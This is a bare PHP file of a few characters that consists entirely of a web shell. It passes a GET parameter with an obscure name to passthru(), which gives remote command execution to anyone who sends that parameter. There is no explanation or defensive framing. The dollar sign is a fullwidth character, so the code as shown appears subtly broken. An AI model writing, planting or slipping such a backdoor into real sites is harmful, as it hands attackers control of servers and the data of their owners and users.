<?php
passthru(＄_GET['8vnQ2drf']);
?>
